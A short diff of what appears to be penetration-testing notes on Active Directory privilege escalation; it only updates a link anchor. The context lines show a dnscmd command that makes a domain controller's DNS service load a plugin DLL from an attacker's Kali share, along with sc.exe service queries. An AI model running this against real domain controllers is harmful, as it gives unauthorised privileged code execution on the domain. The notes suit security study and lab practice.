@@ -31,4 +31,4 @@ dnscmd <DC-FQDN> /config /serverlevelplugindll \\<KALI>\share\plugin.dll
 sc.exe \\<DC-FQDN> query dns
 sc.exe qc <SERVICE>
 ```
-- DnsAdmins: plug-in DLL + restart of the DNS service. Server Operators: exact service rights → [ad/privileged-groups](../ad/privileged-groups.md#server-operators-exact-service-rights-benign-execution-proof).
+- DnsAdmins: plug-in DLL + restart of the DNS service. Server Operators: exact service rights → [ad/privileged-groups](../ad/privileged-groups.md#server-operators).
